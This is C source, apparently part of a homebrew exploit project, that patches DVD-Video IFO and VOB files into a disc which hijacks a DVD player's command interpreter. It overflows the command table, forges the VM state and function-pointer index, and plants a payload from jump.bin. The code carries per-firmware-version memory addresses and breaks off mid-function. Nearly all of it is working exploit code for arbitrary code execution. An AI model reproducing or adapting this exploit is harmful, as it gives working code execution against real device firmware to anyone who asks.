#include "pgc.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define V300X ( \
    defined(V300J) || \
    defined(V300U) || \
    defined(V300A) || \
    defined(V300E) \
)

#define V302X ( \
    defined(V302J) || \
    defined(V302U) || \
    defined(V302A) || \
    defined(V302E) || \
    defined(V302K) || \
    defined(V302G) || \
    defined(V302D) || \
    defined(V302C) \
)

#define V303X ( \
    defined(V303J) || \
    defined(V303E) \
)

#define V304X ( \
    defined(V304M) || \
    defined(V304J) \
)

#define MIN(x, y) ((x) > (y) ? (y) : (x))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
    pgc_t *pgc = (pgc_t *)calloc(1, sizeof(pgc_t));
    uint8_t *pgc_buf = NULL;
    uint32_t pgc_buf_len = 0;

    if (!pgc) {
        return -1;
    }

    if (!out_path) {
        free(pgc);
        return -1;
    }

    for (int i = 0; i < 16; ++i) {
        pgc->pgc_gi.pgc_sp_plt[i] = 0x108080;
    }

    pgc->pgc_gi.set_pgc_cnt_cn(1);
    pgc->pgc_gi.set_pgc_cnt_pn(1);
    pgc->pgc_gi.set_pgc_pb_tm_hours(0);
    pgc->pgc_gi.set_pgc_pb_tm_minutes(0);
    pgc->pgc_gi.set_pgc_pb_tm_seconds(1);
    pgc->pgc_gi.set_pgc_pb_tm_frames(15);
    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_30);
    pgc->pgc_gi.pgc_ast_ctlt[0].stream_num_pf = 1 << 7;
    pgc->pgc_gi.pgc_pgmap_sa = 0xec;
    pgc->pgc_gi.c_pbit_sa = 0xee;
    pgc->pgc_gi.c_posit_sa = 0x106;
    pgc->pgc_gi.pgc_cmdt_sa = 0x11e + off;

    pgc->pgc_pgmap.en_cn[0] = 1;

    pgc->c_pbit.pbi[0].set_c_cat_sys_tm_clk_discontinuity_flag(1);
    pgc->c_pbit.pbi[0].set_c_pbtm_hours(0);
    pgc->c_pbit.pbi[0].set_c_pbtm_minutes(0);
    pgc->c_pbit.pbi[0].set_c_pbtm_seconds(1);
    pgc->c_pbit.pbi[0].set_c_pbtm_frames(15);
    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_30);
    pgc->c_pbit.pbi[0].c_lvobu_sa = 24;
    pgc->c_pbit.pbi[0].c_lvobu_ea = 43;

    pgc->c_posit.c_posi[0].c_vob_idn = 1;
    pgc->c_posit.c_posi[0].c_idn = 1;

    pgc->pgc_cmdt.cmds[1] = 0x30;
    pgc->pgc_cmdt.pgc_cmdti.pre_cmd_n = MAX(1, ((len >> 3) + 1) & 0xffff);
    pgc->pgc_cmdt.pgc_cmdti.pgc_cmdt_ea = 15;
    pgc_build(pgc, &pgc_buf, &pgc_buf_len);
    if (!pgc_buf) {
        free(pgc);
        return -1;
    }
    uint8_t vts_pgci[16] = {
        0, 1, 0, 0,
        0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff,
        0, 0, 0, 16
    };

    uint32_t end_addr = 16 + (pgc_buf_len - 1);

    if (*((uint16_t *)"\x00\x01") == 1) {
        memcpy(vts_pgci+4, &end_addr, 4);
        memcpy(vts_pgci+8, &eaddr, 4);
    } else {
        vts_pgci[4] = ((uint8_t *)&end_addr)[3];
        vts_pgci[5] = ((uint8_t *)&end_addr)[2];
        vts_pgci[6] = ((uint8_t *)&end_addr)[1];
        vts_pgci[7] = ((uint8_t *)&end_addr)[0];

        vts_pgci[8] = ((uint8_t *)&eaddr)[3];
        vts_pgci[9] = ((uint8_t *)&eaddr)[2];
        vts_pgci[10] = ((uint8_t *)&eaddr)[1];
        vts_pgci[11] = ((uint8_t *)&eaddr)[0];
    }

    FILE *fp = fopen(out_path, "rb+");
    if (!fp) {
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    if (fwrite(vts_pgci, 1, 16, fp) != 16) {
        fclose(fp);
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    fseek(fp, 16, SEEK_SET);
    if (fwrite(pgc_buf, 1, pgc_buf_len, fp) != pgc_buf_len) {
        fclose(fp);
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    fclose(fp);
    free(pgc_buf);
    free(pgc);
    return 0;
}

#ifdef V300E
#define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
#define VM_ADDR 0x01558e40
#define VOB_BUFFER_ADDR 0x0155cec0
#define JUMP_POINTER 0x0090ec20
#define CMD_DATA_ADDR 0x01551da8
#define IFO_BUFFER 0x01555600
#elif V300U
#define VM_CMD_PARSER_SWITCH_ADDR 0x00909108
#define VM_ADDR 0x01383840
#define VOB_BUFFER_ADDR 0x013878c0
#define JUMP_POINTER 0x0090eb18
#define CMD_DATA_ADDR 0x0137c7a8
#define IFO_BUFFER 0x01380000
#elif V300J
#define VM_CMD_PARSER_SWITCH_ADDR 0x00684988
#define VM_ADDR 0x010ff040
#define VOB_BUFFER_ADDR 0x011030c0
#define JUMP_POINTER 0x0068a318
#define CMD_DATA_ADDR 0x010f7fa8
#define IFO_BUFFER 0x010fb800
#elif V302E
#define VM_CMD_PARSER_SWITCH_ADDR 0x0090c378
#define VM_ADDR 0x015a50c0
#define VOB_BUFFER_ADDR 0x015adac0
#define JUMP_POINTER 0x009112c8
#define CMD_DATA_ADDR 0x0159f030
#define IFO_BUFFER 0x015a2880
#elif V302C
#define VM_CMD_PARSER_SWITCH_ADDR 0x006ee2f8
#define VM_ADDR 0x01386fc0
#define VOB_BUFFER_ADDR 0x0138f9c0
#define JUMP_POINTER 0x006f31c8
#define CMD_DATA_ADDR 0x01380f30
#define IFO_BUFFER 0x01384780
#elif V302D
#define VM_CMD_PARSER_SWITCH_ADDR 0x00678478
#define VM_ADDR 0x01311140
#define VOB_BUFFER_ADDR 0x01319b40
#define JUMP_POINTER 0x0067d348
#define CMD_DATA_ADDR 0x0130b0b0
#define IFO_BUFFER 0x0130e900
#elif V302G
#define VM_CMD_PARSER_SWITCH_ADDR 0x00683df8
#define VM_ADDR 0x0131cac0
#define VOB_BUFFER_ADDR 0x013254c0
#define JUMP_POINTER 0x00688cc8
#define CMD_DATA_ADDR 0x01316a30
#define IFO_BUFFER 0x0131a280
#elif V302J
#define VM_CMD_PARSER_SWITCH_ADDR 0x00685f78
#define VM_ADDR 0x01149740
#define VOB_BUFFER_ADDR 0x01152140
#define JUMP_POINTER 0x0068ae40
#define CMD_DATA_ADDR 0x011436b0
#define IFO_BUFFER 0x01146f00
#elif V302K
#define VM_CMD_PARSER_SWITCH_ADDR 0x00682878
#define VM_ADDR 0x0131b540
#define VOB_BUFFER_ADDR 0x01323f40
#define JUMP_POINTER 0x00687748
#define CMD_DATA_ADDR 0x013154b0
#define IFO_BUFFER 0x01318d00
#elif V302U
#define VM_CMD_PARSER_SWITCH_ADDR 0x0090c278
#define VM_ADDR 0x013cfac0
#define VOB_BUFFER_ADDR 0x013d84c0
#define JUMP_POINTER 0x009111c0
#define CMD_DATA_ADDR 0x013c9a30
#define IFO_BUFFER 0x013cd280
#elif V303E
#define VM_CMD_PARSER_SWITCH_ADDR 0x00923d88
#define VM_ADDR 0x015f4b00
#define VOB_BUFFER_ADDR 0x015f94c0
#define JUMP_POINTER 0x009292d0
#define CMD_DATA_ADDR 0x015ec890
#define DR_ADDR 0x015f4100
#define IFO_BUFFER 0x015f0100
#elif V303J
#define VM_CMD_PARSER_SWITCH_ADDR 0x0069de88
#define VM_ADDR 0x01199680
#define VOB_BUFFER_ADDR 0x0119e040
#define JUMP_POINTER 0x006a3348
#define CMD_DATA_ADDR 0x01191410
#define DR_ADDR 0x01198c80
#define IFO_BUFFER 0x01194c80
#elif V304M
#define VM_CMD_PARSER_SWITCH_ADDR 0x0095ace8
#define VM_ADDR 0x016cf740
#define VOB_BUFFER_ADDR 0x016d4100
#define JUMP_POINTER 0x009601e8
#define CMD_DATA_ADDR 0x016c8cd4
#define DR_ADDR 0x016ced40
#define IFO_BUFFER 0x016cad40
#define VM_PATCH_START_POS 428
#elif V304J
#define VM_CMD_PARSER_SWITCH_ADDR 0x006d4e68
#define VM_ADDR 0x01274340
#define VOB_BUFFER_ADDR 0x01278d00
#define JUMP_POINTER 0x006da2e0
#define CMD_DATA_ADDR 0x0126d8d4
#define DR_ADDR 0x01273940
#define IFO_BUFFER 0x0126f940
#define VM_PATCH_START_POS 424
#elif V310X
#define VM_CMD_PARSER_SWITCH_ADDR 0x005b9d40
#define VM_ADDR 0x01412840
#define VOB_BUFFER_ADDR 0x01417200
#define JUMP_POINTER 0x5F9C48
//#define JUMP_POINTER 0x006a6800
#define CMD_DATA_ADDR 0x0140bdd4
#define DR_ADDR 0x0140bdd4
#define IFO_BUFFER 0x0140de40
#define VM_PATCH_START_POS 25108
#endif

// 0x005b9d40 0x5f9d3c

#define IFO_PGC_PATCH_LOC 0xcc
#define NEW_PGC_SECT "\x00\x00\x00\x32"
#if V310X
#define VOB_DIFF_RAW (0x01500014 - VOB_BUFFER_ADDR)
#define VOB_REM_RAW (VOB_DIFF_RAW % 0x810)
#define VOB_DIV_RAW (VOB_DIFF_RAW / 0x810)
#define VOB_PATCH_1_LOC ((VOB_DIV_RAW * 0x800) + ((VOB_REM_RAW > 12) ? (VOB_REM_RAW - 12) : 0))
#else
#define VOB_PATCH_1_LOC 0x644
#endif

#define CTRL_DATA_ADDR (VOB_BUFFER_ADDR + 0x0c + 0x629)
#define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
#define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
#define EXEC_ADDR (CTRL_DATA_ADDR + 27)
#define IFO_CMDT_PATCH_LOC 0x10FC
#define IFO_PGC_CAT_PATCH_LOC 0x1008

#if V302X
#define INITIAL_COPY_BUF (IFO_BUFFER + 0x104)
#elif V300X
#define INITIAL_COPY_BUF (IFO_BUFFER + 0x18)
#endif

#if V300X || V302X
#define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
#endif

#if V302X
#define NEEDED_LEN_I2 ((INITIAL_COPY_BUF_TARGET - CMD_DATA_ADDR) + 24)
#define INITIAL_COPY_BUF_TARGET_I2 (INITIAL_COPY_BUF + (NEEDED_LEN_I2 - 24))

#define NEEDED_LEN_I3 ((INITIAL_COPY_BUF_TARGET_I2 - CMD_DATA_ADDR) + 24)
#define INITIAL_COPY_BUF_TARGET_I3 (INITIAL_COPY_BUF + (NEEDED_LEN_I3 - 24))

#define VOB_PATCH_0_LOC 0x21b0
#elif V300X
#define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
#define VOB_PATCH_0_LOC 0x629
#elif V303X
#define VM_PATCH_LOC (IFO_CMDT_PATCH_LOC + 8 + (NEEDED_LEN - 24))
#define DR_PATCH_LOC (IFO_CMDT_PATCH_LOC + 8 + (DR_ADDR - CMD_DATA_ADDR))

#define SECTS_ALIGN(x) ((x) & ~0x3fff)
#define C_DR_LBA(x) (SECTS_ALIGN(DR_PATCH_LOC + (x)) >> 11)
#define C_DR_LBA_REM(x) ((DR_PATCH_LOC + (x)) - SECTS_ALIGN(DR_PATCH_LOC + (x)))

// I know this part is pedantic you don't have to tell me!
#define DR_LBA_0 (C_DR_LBA(12) & 0xff)
#define DR_LBA_1 ((C_DR_LBA(13) >> 8) & 0xff)
#define DR_LBA_2 ((C_DR_LBA(14) >> 16) & 0xff)
#define DR_LBA_3 ((C_DR_LBA(15) >> 24) & 0xff)

#define DR_STRM_0 ((IFO_BUFFER + C_DR_LBA_REM(420) + 1) & 0xff)
#define DR_STRM_1 (((IFO_BUFFER + C_DR_LBA_REM(421) + 1) >> 8) & 0xff)
#define DR_STRM_2 (((IFO_BUFFER + C_DR_LBA_REM(422) + 1) >> 16) & 0xff)
#define DR_STRM_3 (((IFO_BUFFER + C_DR_LBA_REM(423) + 1) >> 24) & 0xff)

#define BUFFER_END (IFO_BUFFER + 0x4000)
#elif V304X || V310X
#define VM_PATCH_LOC (VM_ADDR - (DR_ADDR + VM_PATCH_START_POS))
#endif

#if V303X || V304X || V310X
#define _MI_LOC (IFO_CMDT_PATCH_LOC + 8 + NEEDED_LEN)
#define _MI_SC ((_MI_LOC >> 11) + ((_MI_LOC % 0x800) ? 1 : 0))
#define MI_SC ((_MI_SC & ~19) + ((_MI_SC % 20) ? 20 : 0))
#define MI_EA (MI_SC - 1)
#if V310X
#define MI_BEA ((MI_SC << 1) + 511)
#else
#define MI_BEA ((MI_SC << 1) + 43)
#endif
#endif

int main() {
    printf("NEEDED_LEN: %x\n", NEEDED_LEN);

    uint8_t buf[24] = {
        0x00, // VM_current_cmd_type_index
        0x00, // VM_current_cmd_index
        0x00, 0x00, // padding
        CMD_DATA_ADDR & 0xff, // VM_current_cmd_data_lo_lo
        (CMD_DATA_ADDR >> 8) & 0xff, // VM_current_cmd_data_lo_hi
        (CMD_DATA_ADDR >> 16) & 0xff, // VM_current_cmd_data_hi_lo
        (CMD_DATA_ADDR >> 24) & 0xff, // VM_current_cmd_data_hi_hi
        0x01, // DAT_01558e48
        0x00, // padding
        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff, // FP_INDEX_lo
        (VM_CMD_PARSER_SWITCH_INDEX_VAL >> 8) & 0xff, // FP_INDEX_lo_hi
        0x00, 0x00, // VM_current_opcode_type
        0x00, // VM_current_opcode_direct
        0x00, // padding
        0x00, 0x00, // VM_current_opcode_set
        0x00, 0x00, // VM_current_opcode_dir_cmp
        0x03, 0x00, // VM_current_opcode_cmp
        0x00, 0x00 // VM_current_opcode_cmd
    };

    FILE *fp = fopen("./build/jump.bin", "rb");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open jump.bin\n");
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "Error: Failed to get file size\n");
        fclose(fp);
        return -1;
    }
    uint32_t payload_len = (uint32_t)file_size;
    if (payload_len > 444) {
        printf("Warning: payload truncated from %u to 444 bytes!\n", payload_len);
        payload_len = 444;
    }
    fseek(fp, 0, SEEK_SET);
    uint8_t *payload = malloc(payload_len);
    if (!payload) {
        fprintf(stderr, "Error: Failed to allocate memory for payload\n");
        fclose(fp);
        return -1;
    }
    if (fread(payload, 1, payload_len, fp) != payload_len) {
        fprintf(stderr, "Error: Failed to read payload\n");
        free(payload);
        fclose(fp);
        return -1;
    }
    fclose(fp);

    fp = fopen("./build/fs/VIDEO_TS/VTS_01_1.VOB", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_01_1.VOB\n");
        free(payload);
        return -1;
    }
#if V300X || V302X
    fseek(fp, VOB_PATCH_0_LOC, SEEK_SET);
    if (fwrite(buf, 1, 24, fp) != 24) {
        fprintf(stderr, "Error: Failed to write buffer to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }
#endif
#if V310X
    uint8_t packs[0x10800];
    fseek(fp, 22528, SEEK_SET);
    if (fread(packs, 1, 0x10800, fp) != 0x10800) {
        fprintf(stderr, "Error: Failed to read packs from VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }

    uint8_t pack[2048] = {0};
    uint32_t fl = (VOB_DIV_RAW + 1) * 0x800;
    uint32_t fls = fl / 0x800;
    uint32_t fls2 = fls + 13;

    packs[0x2d] = (fls >> 24) & 0xff;
    packs[0x2e] = (fls >> 16) & 0xff;
    packs[0x2f] = (fls >> 8) & 0xff;
    packs[0x30] = fls & 0xff;

    packs[0x40b] = (fls >> 24) & 0xff;
    packs[0x40c] = (fls >> 16) & 0xff;
    packs[0x40d] = (fls >> 8) & 0xff;
    packs[0x40e] = fls & 0xff;

    packs[0x682d] = (fls2 >> 24) & 0xff;
    packs[0x682e] = (fls2 >> 16) & 0xff;
    packs[0x682f] = (fls2 >> 8) & 0xff;
    packs[0x6830] = fls2 & 0xff;

    packs[0x6c0b] = (fls2 >> 24) & 0xff;
    packs[0x6c0c] = (fls2 >> 16) & 0xff;
    packs[0x6c0d] = (fls2 >> 8) & 0xff;
    packs[0x6c0e] = fls2 & 0xff;

    fseek(fp, fl, SEEK_SET);
    if (fwrite(packs, 1, 0x10800, fp) != 0x10800) {
        fprintf(stderr, "Error: Failed to write packs to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }

    uint8_t vea[4] = {
        (VOB_DIV_RAW >> 24) & 0xff,
        (VOB_DIV_RAW >> 16) & 0xff,
        (VOB_DIV_RAW >> 8) & 0xff,
        VOB_DIV_RAW & 0xff
    };

    fseek(fp, 0x40f, SEEK_SET);
    if (fwrite(vea, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write ea to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }

    for (int i = 22528; i < fl; i += 2048) {
        fseek(fp, i, SEEK_SET);
        if (fwrite(pack, 1, 2048, fp) != 2048) {
            fprintf(stderr, "Error: Failed to write pack to VOB\n");
            free(payload);
            fclose(fp);
            return -1;
        }
    }
    fseek(fp, 1048575, SEEK_SET);
    if (fwrite("\x00", 1, 1, fp) != 1) {
        fprintf(stderr, "Error: Failed to write pad to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }
#endif
    fseek(fp, VOB_PATCH_1_LOC, SEEK_SET);
    if (fwrite(payload, 1, payload_len, fp) != payload_len) {
        fprintf(stderr, "Error: Failed to write payload to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }
    free(payload);
    fclose(fp);
#if V303X || V304X || V310X
#if V310X
    fp = fopen("./build/fs/VIDEO_TS/VTS_01_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_01_0.IFO\n");
        return -1;
    }

    uint8_t bf[8] = {
        (fls >> 24) & 0xff,
        (fls >> 16) & 0xff,
        (fls >> 8) & 0xff,
        fls & 0xff,
        (fls2 >> 24) & 0xff,
        (fls2 >> 16) & 0xff,
        (fls2 >> 8) & 0xff,
        fls2 & 0xff
    };

    fseek(fp, 0x111e, SEEK_SET);
    if (fwrite(&bf[4], 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2808, SEEK_SET);
    if (fwrite(bf, 1, 8, fp) != 8) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2010, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x0c, SEEK_SET);
    if (fwrite("\x00\x00\x02\x0b", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x1122, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fclose(fp);
#endif
    fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
        return -1;
    }

    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
    
    if (fwrite("\x00\x01\x00\x00", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

#if V310X
    fseek(fp, 0x111e, SEEK_SET);
    if (fwrite(&bf[4], 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2808, SEEK_SET);
    if (fwrite(bf, 1, 8, fp) != 8) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2010, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x0c, SEEK_SET);
    if (fwrite("\x00\x00\x02\x0b", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x1122, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
#endif

    fclose(fp);

    fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_03_0.IFO\n");
        return -1;
    }
    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
    
    if (fwrite("\x00\x01\x00\x00", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

#if V310X
    fseek(fp, 0x111e, SEEK_SET);
    if (fwrite(&bf[4], 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2808, SEEK_SET);
    if (fwrite(bf, 1, 8, fp) != 8) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2010, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
    
    fseek(fp, 0x2808, SEEK_SET);
    if (fwrite(bf, 1, 8, fp) != 8) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x0c, SEEK_SET);
    if (fwrite("\x00\x00\x02\x0b", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x1122, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
#endif

    fclose(fp);

    uint32_t tmp = MAX(
        (
            (NEEDED_LEN >> 3) +
            ((NEEDED_LEN % 8) ? 1 : 0)
        ),
        1
    );
    uint32_t tmp_pre = tmp, tmp_post = 0, tmp_cell = 0;
    if (tmp > 0xffff) {
        tmp_pre = 0xffff;
        tmp_post = tmp - 0xffff;
    }
    if (tmp > 0x1fffe) {
        tmp_post = 0xffff;
        tmp_cell = tmp - 0x1fffe;
    }
    if (tmp > 0x2fffd) {
        tmp_cell = 0xffff;
    }

    uint8_t ifo_patch_buf[16] = {
        (tmp_pre >> 8) & 0xff, tmp_pre & 0xff, // CMDT_PRE_CNT
        (tmp_post >> 8) & 0xff, tmp_post & 0xff, // CMDT_POST_CNT
        (tmp_cell >> 8) & 0xff, tmp_cell & 0xff, // CMDT_CELL_CNT
        0, 15, // CMDT_EA
        0, 48, 0, 0, 0, 0, 0, 0 // BROKEN_CMD
    };

    fp = fopen("./build/fs/VIDEO_TS/VTS_04_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n");
        return -1;
    }

#if V310X
    fseek(fp, 0x111e, SEEK_SET);
    if (fwrite(&bf[4], 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2808, SEEK_SET);
    if (fwrite(bf, 1, 8, fp) != 8) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x2010, SEEK_SET);
    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
#endif

    fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
    
    if (fwrite(ifo_patch_buf, 1, 16, fp) != 16) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, IFO_PGC_CAT_PATCH_LOC, SEEK_SET);

    ifo_patch_buf[0] = (EXEC_ADDR >> 24) & 0xff;
    ifo_patch_buf[1] = (EXEC_ADDR >> 16) & 0xff;
    ifo_patch_buf[2] = (EXEC_ADDR >> 8) & 0xff;
    ifo_patch_buf[3] = EXEC_ADDR & 0xff;
    
    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    // ifo end sector
    fseek(fp, 0x1c, SEEK_SET);

    ifo_patch_buf[0] = (MI_EA >> 24) & 0xff;
    ifo_patch_buf[1] = (MI_EA >> 16) & 0xff;
    ifo_patch_buf[2] = (MI_EA >> 8) & 0xff;
    ifo_patch_buf[3] = MI_EA & 0xff;
    
    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
    
    // vob start sector
    fseek(fp, 0xc4, SEEK_SET);

    ifo_patch_buf[0] = (MI_SC >> 24) & 0xff;
    ifo_patch_buf[1] = (MI_SC >> 16) & 0xff;
    ifo_patch_buf[2] = (MI_SC >> 8) & 0xff;
    ifo_patch_buf[3] = MI_SC & 0xff;
    
    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    // bup end sector
    fseek(fp, 0x0c, SEEK_SET);

    ifo_patch_buf[0] = (MI_BEA >> 24) & 0xff;
    ifo_patch_buf[1] = (MI_BEA >> 16) & 0xff;
    ifo_patch_buf[2] = (MI_BEA >> 8) & 0xff;
    ifo_patch_buf[3] = MI_BEA & 0xff;
    
    if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    // expand file to MI_SC sectors
    fseek(fp, (MI_SC << 11) - 1, SEEK_SET);
    if (fwrite("\x00", 1, 1, fp) != 1) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

#if V304X || V310X
    fclose(fp);

    fp = fopen("./build/fs/VIDEO_TS/VIDEO_TS.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VIDEO_TS.IFO\n");
        return -1;
    }
#elif V303X
    // restore the broken disc reader state

    uint8_t data_reader_ctx[480]; // 428+4+16*3
    memset(data_reader_ctx, 0, sizeof(data_reader_ctx));
    // STATUS
    data_reader_ctx[0] = 0;
    data_reader_ctx[1] = 0;
    data_reader_ctx[2] = 0;
    data_reader_ctx[3] = 0;
    // VTSN
    data_reader_ctx[4] = 4;
    data_reader_ctx[5] = 0;
    data_reader_ctx[6] = 0;
    data_reader_ctx[7] = 0;
    // VTSN
    data_reader_ctx[8] = 4;
    data_reader_ctx[9] = 0;
    data_reader_ctx[10] = 0;
    data_reader_ctx[11] = 0;
    // LBA
    data_reader_ctx[12] = DR_LBA_0;
    data_reader_ctx[13] = DR_LBA_1;
    data_reader_ctx[14] = DR_LBA_2;
    data_reader_ctx[15] = DR_LBA_3;
    // SECTOR_CNT
    data_reader_ctx[16] = 8;
    data_reader_ctx[17] = 0;
    data_reader_ctx[18] = 0;
    data_reader_ctx[19] = 0;
    // VIDEO_TS.IFO EA
    data_reader_ctx[20] = 3;
    data_reader_ctx[21] = 0;
    data_reader_ctx[22] = 0;
    data_reader_ctx[23] = 0;
    // VTS_01_0.IFO EA
    data_reader_ctx[24] = 5;
    data_reader_ctx[25] = 0;
    data_reader_ctx[26] = 0;
    data_reader_ctx[27] = 0;
    // VTS_02_0.IFO EA
    data_reader_ctx[28] = 5;
    data_reader_ctx[29] = 0;
    data_reader_ctx[30] = 0;
    data_reader_ctx[31] = 0;
    // VTS_03_0.IFO EA
    data_reader_ctx[32] = 5;
    data_reader_ctx[33] = 0;
    data_reader_ctx[34] = 0;
    data_reader_ctx[35] = 0;
    // VTS_04_0.IFO EA
    data_reader_ctx[36] = 19;
    data_reader_ctx[37] = 0;
    data_reader_ctx[38] = 0;
    data_reader_ctx[39] = 0;
    // STM_PTR
    data_reader_ctx[420] = DR_STRM_0;
    data_reader_ctx[421] = DR_STRM_1;
    data_reader_ctx[422] = DR_STRM_2;
    data_reader_ctx[423] = DR_STRM_3;
    // STM_EA
    data_reader_ctx[424] = BUFFER_END & 0xff;
    data_reader_ctx[425] = (BUFFER_END >> 8) & 0xff;
    data_reader_ctx[426] = (BUFFER_END >> 16) & 0xff;
    data_reader_ctx[427] = (BUFFER_END >> 24) & 0xff;

    data_reader_ctx[452] = 0x01;
    data_reader_ctx[459] = 0x02;
    data_reader_ctx[472] = 0x18;
    data_reader_ctx[476] = 0x2b;

    fseek(fp, DR_PATCH_LOC, SEEK_SET);
    if (fwrite(data_reader_ctx, 1, 480, fp) != 480) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
#endif

    fseek(fp, VM_PATCH_LOC, SEEK_SET);
    if (fwrite(buf, 1, 24, fp) != 24) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

#if V310X
    fseek(fp, 0x0c, SEEK_SET);
    if (fwrite("\x00\x00\x00\x37", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

    fseek(fp, 0x1c, SEEK_SET);
    if (fwrite("\x00\x00\x00\x1b", 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }

